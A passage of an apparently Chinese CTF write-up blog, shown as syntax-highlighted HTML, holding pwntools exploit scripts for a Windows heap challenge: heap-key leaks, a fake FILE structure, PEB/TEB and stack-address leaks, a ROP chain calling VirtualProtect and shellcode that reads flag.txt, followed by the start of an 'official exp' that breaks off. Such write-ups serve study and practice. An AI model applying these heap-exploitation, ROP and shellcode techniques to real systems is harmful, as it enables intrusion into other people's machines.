class="number">1</span>)</span><br><span class="line">		p.recvuntil(<span class="string">' al'</span>)</span><br><span class="line">		Encoding = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) ^ <span class="number">0x0000000908010009</span></span><br><span class="line">		log.success(<span class="string">'Encoding = '</span>+hex(Encoding))</span><br><span class="line"></span><br><span class="line">		payload = <span class="string">'\x11'</span>*<span class="number">0x88</span> + p64(<span class="number">0x0800000920010021</span> ^ Encoding)[:<span class="number">6</span>]</span><br><span class="line">		edit(<span class="number">1</span>,payload)</span><br><span class="line">		delete(<span class="number">2</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">4</span>)</span><br><span class="line">		show(<span class="number">3</span>)</span><br><span class="line">		p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">		heapbase = (u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))<span class="number">-0x10000</span>) &amp; <span class="number">0xffffffffffff0000</span></span><br><span class="line">		<span class="keyword">if</span>(heapbase != <span class="number">0</span>):</span><br><span class="line">			log.success(<span class="string">'heapbase = '</span>+hex(heapbase))</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			p.close()</span><br><span class="line">			p = remote(<span class="string">'192.168.21.1'</span>,<span class="number">10000</span>)</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">	<span class="comment">#----------------------------------------------------------------------------------</span></span><br><span class="line">		open_file()</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">7</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">0x0800000613010012</span> ^ Encoding)</span><br><span class="line"></span><br><span class="line">		fake_file = p64(<span class="number">0</span>)+p64(<span class="number">0xBEEFDAD0000</span>+<span class="number">0x28</span>+<span class="number">0x20</span>)</span><br><span class="line">		fake_file+= p32(<span class="number">0</span>)+p32(<span class="number">0x2080</span>)+p32(<span class="number">0</span>)+p32(<span class="number">0</span>)</span><br><span class="line">		fake_file+= p64(<span class="number">0x100</span>)+p64(<span class="number">0</span>)</span><br><span class="line">		fake_file+= p64(<span class="number">0xffffffffffffffff</span>)+p32(<span class="number">0xffffffff</span>)+p32(<span class="number">0</span>)</span><br><span class="line">		fake_file+= p64(<span class="number">0</span>)+p64(<span class="number">0</span>)</span><br><span class="line">		edit(<span class="number">3</span>,fake_file+p64(<span class="number">0</span>)+p64(<span class="number">0x0800000613010012</span> ^ Encoding))</span><br><span class="line">		delete(<span class="number">7</span>)</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">         <span class="comment">#改ucrtbase!_pioinfo[0].flag</span></span><br><span class="line">		read_file(<span class="number">4</span>,<span class="number">8</span>,p64(heapbase+<span class="number">0x8740</span>+<span class="number">0x38</span>))</span><br><span class="line">		edit(<span class="number">4</span>,p8(<span class="number">0xc1</span>))</span><br><span class="line">		</span><br><span class="line">		edit(<span class="number">5</span>,p64(<span class="number">0xBEEFDAD0000</span>+<span class="number">6</span>*<span class="number">0x28</span>+<span class="number">0x20</span><span class="number">-0x8</span>)+p64(<span class="number">0xBEEFDAD0000</span>+<span class="number">6</span>*<span class="number">0x28</span>+<span class="number">0x20</span>))</span><br><span class="line">		new(<span class="number">0x88</span>,<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">		edit(<span class="number">0x0800000613010012</span> ^ Encoding, flat([<span class="number">0</span>, <span class="number">0xDDAABEEF1ACD</span>, <span class="number">0x200</span>, <span class="number">100</span>, <span class="number">0xDDAABEEF1ACD</span>, <span class="number">0xBEEFDAD0000</span>]))</span><br><span class="line">		payload = p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">		payload+= p64(<span class="number">1</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(<span class="number">0xBEEFDAD0000</span>)</span><br><span class="line">		payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">		payload+= p64(<span class="number">2</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(PebLdr<span class="number">-0x38</span>)</span><br><span class="line">		edit(<span class="number">100</span>,payload)</span><br><span class="line">		show(<span class="number">2</span>)</span><br><span class="line">		p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">		Peb = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0x340</span></span><br><span class="line">		Teb = Peb + <span class="number">0x1000</span></span><br><span class="line">		log.success(<span class="string">'Peb = '</span>+hex(Peb))</span><br><span class="line">		log.success(<span class="string">'Teb = '</span>+hex(Teb))</span><br><span class="line"></span><br><span class="line">		payload = p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">		payload+= p64(<span class="number">1</span>)+p64(<span class="number">0xFACE6DA61A35C767</span>)</span><br><span class="line">		payload+= p64(<span class="number">0xBEEFDAD0000</span>)</span><br><span class="line">		payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">		payload+= p64(<span class="number">2</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(Teb+<span class="number">0xa</span>)</span><br><span class="line">		edit(<span class="number">1</span>,payload)</span><br><span class="line">		show(<span class="number">2</span>)</span><br><span class="line">		p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">		stack = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) &lt;&lt; <span class="number">16</span></span><br><span class="line">		log.success(<span class="string">'stack = '</span>+hex(stack))</span><br><span class="line"></span><br><span class="line">		main_ret_content = binbase + <span class="number">0x1B78</span></span><br><span class="line">		main_ret_addr = <span class="number">0</span></span><br><span class="line">		key = <span class="number">0</span></span><br><span class="line">		<span class="keyword">for</span> addr <span class="keyword">in</span> range(stack<span class="number">-0x800</span>,stack,<span class="number">9</span>*<span class="number">0x8</span>):</span><br><span class="line">			<span class="keyword">if</span> key == <span class="number">1</span>:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			log.info(<span class="string">'addr = '</span>+hex(addr))</span><br><span class="line">			payload = p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">1</span>)+p64(<span class="number">0xFACE6DA61A35C767</span>)</span><br><span class="line">			payload+= p64(<span class="number">0xBEEFDAD0000</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">2</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">3</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x08</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">4</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">5</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x18</span>)</span><br><span class="line">			</span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">6</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">7</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x28</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">8</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x30</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">9</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x38</span>)</span><br><span class="line"></span><br><span class="line">			payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">			payload+= p64(<span class="number">10</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">			payload+= p64(addr+<span class="number">0x40</span>)		</span><br><span class="line">			edit(<span class="number">1</span>,payload)</span><br><span class="line">			<span class="keyword">if</span>(main_ret_addr == <span class="number">0</span>):</span><br><span class="line">				<span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">2</span>,<span class="number">11</span>):</span><br><span class="line">					show(i)</span><br><span class="line">					p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">					result = u64(p.recvuntil(<span class="string">'\r\n'</span>,drop=<span class="keyword">True</span>)[:<span class="number">8</span>].ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line">					<span class="keyword">if</span>(result == main_ret_content):</span><br><span class="line">						main_ret_addr = addr+(i<span class="number">-2</span>)*<span class="number">0x8</span></span><br><span class="line">						key = <span class="number">1</span></span><br><span class="line">						<span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(main_ret_addr == <span class="number">0</span>):</span><br><span class="line">			log.info(<span class="string">'bad luck....'</span>)</span><br><span class="line">			exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">		log.success(<span class="string">'main_ret_addr = '</span>+hex(main_ret_addr))</span><br><span class="line">		<span class="comment">#--------------------------------------------------------------</span></span><br><span class="line">		pop_rdx_rcx_r8_r9_r10_r11 = ntdll + <span class="number">0x8FB20</span> </span><br><span class="line">		VirtualProtectStub = KERNEL32 + <span class="number">0x1b680</span></span><br><span class="line">		HeapCreateStub = KERNEL32 + (<span class="number">0x00007ffcafb7ec80</span><span class="number">-0x00007ffcafb60000</span>)</span><br><span class="line">		ProcessHeap = Peb+<span class="number">0x30</span></span><br><span class="line">		_open = ucrtbase + (<span class="number">0x0007ffcad912a30</span><span class="number">-0x00007ffcad870000</span>)</span><br><span class="line">		_read = ucrtbase +  <span class="number">0x16270</span></span><br><span class="line">		_sleep = ucrtbase + (<span class="number">0x0007ffcad9219d0</span><span class="number">-0x00007ffcad870000</span>)</span><br><span class="line">		_write = ucrtbase + (<span class="number">0x00007ffcad885bf0</span><span class="number">-0x00007ffcad870000</span>)</span><br><span class="line">		_exit = ucrtbase + (<span class="number">0x00007ffcad8e06d0</span><span class="number">-0x00007ffcad870000</span>)</span><br><span class="line">		_acrt_heap = ucrtbase + <span class="number">0xeb550</span></span><br><span class="line">		<span class="comment">#00007ffc`ad95b550 ucrtbase!_acrt_heap = &lt;no type information&gt;</span></span><br><span class="line">		buf = binbase + <span class="number">0x5e00</span></span><br><span class="line">		shellcode_addr = binbase + <span class="number">0x5800</span></span><br><span class="line">		shellcode = <span class="string">'\x90'</span>*<span class="number">0x20</span> +  asm(<span class="string">"""</span></span><br><span class="line"><span class="string">		        xor rcx,rcx</span></span><br><span class="line"><span class="string">		        xor rdx,rdx</span></span><br><span class="line"><span class="string">		        xor r8,r8</span></span><br><span class="line"><span class="string">		        xor r9,r9</span></span><br><span class="line"><span class="string">		        xor rdi,rdi</span></span><br><span class="line"><span class="string">		        mov cl,2</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        mov qword ptr [rdi],rax</span></span><br><span class="line"><span class="string">		        sub rsp,0x1000</span></span><br><span class="line"><span class="string">		    open :</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        mov rcx,0x%x</span></span><br><span class="line"><span class="string">		        xor rdx,rdx</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">		    read:</span></span><br><span class="line"><span class="string">		        mov rcx,rax</span></span><br><span class="line"><span class="string">		        mov rdx,0x%x</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        mov r8,0x40</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">		    write :</span></span><br><span class="line"><span class="string">		        mov r8,rax</span></span><br><span class="line"><span class="string">		        mov rdx,0x%x</span></span><br><span class="line"><span class="string">		        xor rcx,rcx</span></span><br><span class="line"><span class="string">		        inc rcx</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">		    sleep:</span></span><br><span class="line"><span class="string">		        mov rcx,20</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">		    exit:</span></span><br><span class="line"><span class="string">		        mov rdi,0x%x</span></span><br><span class="line"><span class="string">		        call rdi</span></span><br><span class="line"><span class="string">	    """</span> % (HeapCreateStub,ProcessHeap,_acrt_heap,_open,buf,buf,_read,buf,_write,_sleep,_exit))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">		rop = p64(pop_rdx_rcx_r8_r9_r10_r11)</span><br><span class="line">		rop+= p64(<span class="number">0x1000</span>)</span><br><span class="line">		rop+= p64(binbase+<span class="number">0x5000</span>)</span><br><span class="line">		rop+= p64(<span class="number">0x40</span>)</span><br><span class="line">		rop+= p64(shellcode_addr<span class="number">-8</span>)</span><br><span class="line">		rop+= p64(<span class="number">0</span>)</span><br><span class="line">		rop+= p64(<span class="number">0</span>)</span><br><span class="line">		rop+= p64(VirtualProtectStub)</span><br><span class="line">		rop+= p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">		payload = p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x1000</span>)</span><br><span class="line">		payload+= p64(<span class="number">1</span>)+p64(<span class="number">0xFACE6DA61A35C767</span>)</span><br><span class="line">		payload+= p64(<span class="number">0xBEEFDAD0000</span>)</span><br><span class="line"></span><br><span class="line">		payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x200</span>)</span><br><span class="line">		payload+= p64(<span class="number">2</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(shellcode_addr)</span><br><span class="line"></span><br><span class="line">		payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x200</span>)</span><br><span class="line">		payload+= p64(<span class="number">3</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(buf)</span><br><span class="line"></span><br><span class="line">		payload+= p64(<span class="number">0xDDAABEEF1ACD</span>)+p64(<span class="number">0x200</span>)</span><br><span class="line">		payload+= p64(<span class="number">4</span>)+p64(<span class="number">0xDDAABEEF1ACD</span>)</span><br><span class="line">		payload+= p64(main_ret_addr<span class="number">-0x80</span>)</span><br><span class="line">		edit(<span class="number">1</span>,payload)</span><br><span class="line">		edit(<span class="number">2</span>,shellcode)</span><br><span class="line">		edit(<span class="number">3</span>,<span class="string">'flag.txt'</span>)</span><br><span class="line">		edit(<span class="number">4</span>,rop)</span><br><span class="line">		<span class="keyword">break</span></span><br><span class="line">	<span class="keyword">except</span> EOFError:</span><br><span class="line">		p.close()</span><br><span class="line">		p = remote(ip,port)</span><br><span class="line">		<span class="keyword">continue</span></span><br><span class="line">	<span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">		p.close()</span><br><span class="line">		exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="官方exp：-1"><a href="#官方exp：-1" class="headerlink" title="官方exp："></a>官方exp：</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">host = <span class="string">"10.211.55.27"</span></span><br><span class="line">port = <span class="number">6677</span></span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">"amd64"</span>    </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">allocate</span><span class="params">(size,idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"1"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(size))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx,data)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"2"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.send(data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    r.recvuntil(<span class="string">"choice: "</span>)</span><br><span class="line">    r.sendline(<span class="string">"3"</span>)</span><br><span class="line">    r.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    r.sendline(str(idx))</span><br><span 